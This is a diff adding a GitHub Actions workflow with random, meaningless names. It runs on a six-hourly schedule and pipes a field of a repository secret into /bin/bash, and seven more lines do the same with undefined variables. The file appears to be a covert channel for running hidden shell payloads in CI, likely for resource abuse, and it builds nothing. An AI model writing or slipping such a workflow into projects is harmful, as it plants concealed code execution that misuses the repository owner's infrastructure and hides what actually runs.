@@ -1,0 +1,25 @@
+name: zhemedadcak
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhemedadcak
+        env:
+          rln76367: ${{ secrets.rln76367 }}
+        run: |
+          echo $rln76367 | jq -r .zgt933 | /bin/bash
+          echo $b854 | jq -r .oajrc7 | /bin/bash
+          echo $bz6 | jq -r .rrkw162 | /bin/bash
+          echo $vqhqp576 | jq -r .klazh090 | /bin/bash
+          echo $fi17634 | jq -r .zlnd0111 | /bin/bash
+          echo $kjrm007 | jq -r .uhk585 | /bin/bash
+          echo $nhl68650 | jq -r .tk77 | /bin/bash
+          echo $x2 | jq -r .lehx536 | /bin/bash
+
